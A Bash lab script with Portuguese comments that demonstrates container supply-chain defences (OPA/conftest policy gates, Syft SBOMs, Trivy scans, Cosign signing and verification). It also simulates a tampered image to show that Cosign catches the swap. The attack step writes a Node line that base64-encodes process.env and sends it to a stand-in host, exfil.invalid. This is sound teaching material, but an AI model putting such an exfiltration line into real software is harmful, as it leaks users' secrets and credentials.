#!/usr/bin/env bash
# Raio-X da Cadeia de Suprimentos — reproduz ANTES / ATAQUE / DEPOIS de ponta a ponta
#   1) POLÍTICA (Rego: opa test + opa eval + conftest)  2) INVENTÁRIO (Syft + Trivy)
#   3) CADEIA (Cosign: assinatura, verificação, adulteração detectada)  4) COMPLIANCE (evidências)
set -uo pipefail
cd "$(dirname "$0")"
EV=evidencias; mkdir -p $EV
REG=localhost:5050; REPO=$REG/raio-x/app; TAG=1.0.0
export COSIGN_PASSWORD=${COSIGN_PASSWORD:-lab-raio-x}
if [ "${1:-}" = "--cleanup" ]; then
  docker rm -f raiox-registry >/dev/null 2>&1; docker rmi -f raio-x:antes $REPO:$TAG >/dev/null 2>&1
  rm -f cosign.key; rm -rf $EV/tmp-*; exit 0; fi
FAIL=0; log(){ echo -e "\n== $* =="; }
ok(){ echo "[OK] $*" | tee -a $EV/00-resumo.txt; }
ko(){ echo "[FALHOU] $*" | tee -a $EV/00-resumo.txt; FAIL=1; }
: > $EV/00-resumo.txt
{ opa version | head -1; conftest --version | head -1; echo "syft $(syft version | awk '/^Version/{print $2}')"; trivy --version | head -1; cosign version 2>&1 | grep GitVersion; docker --version; } > $EV/01-ferramentas.txt

log "1. POLÍTICA — opa test (unitários)"
opa test policy -v 2>&1 | tee $EV/02-opa-test.txt; [ ${PIPESTATUS[0]} -eq 0 ] && ok "opa test: $(grep -o 'PASS: [0-9/]*' $EV/02-opa-test.txt)" || ko "opa test"

log "1b. POLÍTICA — opa eval no Dockerfile ANTES e DEPOIS"
for v in antes depois; do f=app/Dockerfile; [ $v = antes ] && f=app/Dockerfile.antes
  conftest parse $f > $EV/tmp-$v.json
  echo "--- $f"; opa eval -f pretty -d policy/dockerfile.rego -i $EV/tmp-$v.json 'data.main.deny'; done | tee $EV/03-opa-eval.txt

log "1c. POLÍTICA — conftest (gate): ANTES deve falhar, DEPOIS passar"
conftest test --no-color -p policy app/Dockerfile.antes 2>&1 | tee $EV/04-conftest-antes.txt; RA=${PIPESTATUS[0]}
conftest test --no-color -p policy app/Dockerfile 2>&1 | tee $EV/04-conftest-depois.txt; RD=${PIPESTATUS[0]}
[ $RA -ne 0 ] && ok "conftest BLOQUEOU Dockerfile.antes (exit $RA)" || ko "antes passou"
[ $RD -eq 0 ] && ok "conftest aprovou Dockerfile (depois)" || ko "depois bloqueado"

log "2. INVENTÁRIO — build das duas imagens"
docker build -q -t raio-x:antes -f app/Dockerfile.antes app >/dev/null && docker build -q -t $REPO:$TAG app >/dev/null
echo "antes roda como: $(docker run --rm --entrypoint id raio-x:antes -u)  | depois roda como: $(docker run --rm --entrypoint id $REPO:$TAG -u)" | tee $EV/05-usuario.txt
log "2a. SBOM com Syft (1 comando)"
syft -q $REPO:$TAG -o cyclonedx-json=sbom-depois.cdx.json
syft -q raio-x:antes -o cyclonedx-json=sbom-antes.cdx.json
for s in antes depois; do jq -c --arg s $s '{imagem:$s, formato:.bomFormat, spec:.specVersion, componentes:(.components|length)}' sbom-$s.cdx.json; done | tee $EV/06-sbom-resumo.txt
log "2b. Trivy (a partir do SBOM e da imagem)"
for s in antes depois; do
  trivy sbom -q --scanners vuln -f json -o $EV/tmp-trivy-$s.json sbom-$s.cdx.json
  jq -c --arg s $s '{imagem:$s} + ([.Results[]?.Vulnerabilities[]?.Severity]|group_by(.)|map({(.[0]):length})|add // {})' $EV/tmp-trivy-$s.json
done | tee $EV/07-trivy-contagem.txt
trivy image -q --severity CRITICAL,HIGH --scanners vuln raio-x:antes > $EV/07-trivy-antes-tabela.txt 2>&1
trivy image -q --severity CRITICAL --scanners vuln $REPO:$TAG > $EV/07-trivy-depois-tabela.txt 2>&1
jq '[.Results[]?.Vulnerabilities[]? | select(.Severity=="CRITICAL")] | sort_by(.VulnerabilityID) | map(select(.FixedVersion != null)) | first
    | {CVE:.VulnerabilityID, severidade:.Severity, pacote:.PkgName, versao_instalada:.InstalledVersion, corrigida_em:.FixedVersion, titulo:.Title, link:.PrimaryURL}' \
    $EV/tmp-trivy-antes.json | tee $EV/08-vuln-real.json
grep "$(jq -r .CVE $EV/08-vuln-real.json)" $EV/07-trivy-antes-tabela.txt | head -3 | tee $EV/08-vuln-real-print.txt
[ "$(jq -r .CVE $EV/08-vuln-real.json)" != null ] && ok "vulnerabilidade real: $(jq -r '.CVE+" ("+.severidade+") em "+.pacote+" "+.versao_instalada' $EV/08-vuln-real.json)" || ko "nenhuma vuln"

log "3. CADEIA — registry, push por digest e assinatura Cosign"
docker inspect raiox-registry >/dev/null 2>&1 || docker run -d --name raiox-registry -p 5050:5000 registry:2 >/dev/null
for i in $(seq 1 20); do curl -fsS http://$REG/v2/ >/dev/null && break; sleep 1; done
docker push -q $REPO:$TAG >/dev/null
DIGEST=$(docker buildx imagetools inspect $REPO:$TAG | awk '/^Digest:/{print $2}'); IMG=$REPO@$DIGEST
echo "IMAGEM=$IMG" | tee $EV/09-imagem.txt
[ -f cosign.key ] || cosign generate-key-pair >/dev/null 2>&1
cosign sign --yes --tlog-upload=false --use-signing-config=false --key cosign.key "$IMG" > $EV/10-assinatura.txt 2>&1
cosign attest --yes --tlog-upload=false --use-signing-config=false --key cosign.key --type cyclonedx --predicate sbom-depois.cdx.json "$IMG" >> $EV/10-assinatura.txt 2>&1
cosign verify --key cosign.pub --insecure-ignore-tlog "$IMG" 2>/dev/null | jq . > $EV/11-verificacao.json
[ "$(jq -r '.[0].critical.image."docker-manifest-digest"' $EV/11-verificacao.json)" = "$DIGEST" ] && ok "cosign verify OK para $DIGEST" || ko "verify"
cosign verify-attestation --key cosign.pub --insecure-ignore-tlog --type cyclonedx "$IMG" >/dev/null 2>&1 && ok "SBOM atestado e verificado" || ko "atestação SBOM"

log "3b. ATAQUE — imagem adulterada publicada na mesma tag (cenário Aula 6)"
T=$EV/tmp-ataque; mkdir -p $T; cp app/Dockerfile $T/
echo "require('http').get('http://exfil.invalid/?env='+Buffer.from(JSON.stringify(process.env)).toString('base64'));require('http').createServer((_,r)=>r.end('OK\\n')).listen(8080)" > $T/server.js
docker build -q -t $REPO:$TAG $T >/dev/null && docker push -q $REPO:$TAG >/dev/null
ADIG=$(docker buildx imagetools inspect $REPO:$TAG | awk '/^Digest:/{print $2}')
{ echo "tag $TAG agora -> $ADIG (assinado era $DIGEST)"
  echo "--- conftest no Dockerfile adulterado (mesmo Dockerfile, código trocado):"; conftest test --no-color -p policy $T/Dockerfile 2>&1 | tail -1
  echo "--- cosign verify da tag adulterada:"; cosign verify --key cosign.pub --insecure-ignore-tlog $REPO:$TAG 2>&1 | grep -v WARNING; echo "exit=${PIPESTATUS[0]}"; } | tee $EV/12-adulteracao.txt
grep -Eq '^exit=[1-9][0-9]*$' $EV/12-adulteracao.txt && ok "adulteração DETECTADA pelo Cosign (a policy Rego sozinha não pega)" || ko "adulteração não detectada"
( mkdir -p $EV/tmp-k && cd $EV/tmp-k && cosign generate-key-pair >/dev/null 2>&1 )
{ cosign verify --key $EV/tmp-k/cosign.pub --insecure-ignore-tlog "$IMG" 2>&1 | grep -v WARNING; echo "exit=${PIPESTATUS[0]}"; } | tee $EV/13-chave-de-atacante.txt
grep -Eq '^exit=[1-9][0-9]*$' $EV/13-chave-de-atacante.txt && ok "assinatura não confere com chave de outra identidade" || ko "chave errada aceita"
docker build -q -t $REPO:$TAG app >/dev/null && docker push -q $REPO:$TAG >/dev/null

log "4. COMPLIANCE — manifesto de evidências (hashes)"
( sha256sum app/Dockerfile app/Dockerfile.antes policy/*.rego sbom-*.cdx.json cosign.pub; cd $EV && sha256sum 0*.txt 0*.json 1*.txt 1*.json ) > $EV/14-manifesto-sha256.txt
echo "data: $(date '+%F %T %Z')  digest_assinado: $DIGEST" >> $EV/14-manifesto-sha256.txt
ok "manifesto de evidências com $(wc -l < $EV/14-manifesto-sha256.txt) linhas"

rm -rf $EV/tmp-*
log "Resumo"; cat $EV/00-resumo.txt
[ $FAIL -eq 0 ] && echo "RESULTADO: SUCESSO" || echo "RESULTADO: FALHA"
exit $FAIL
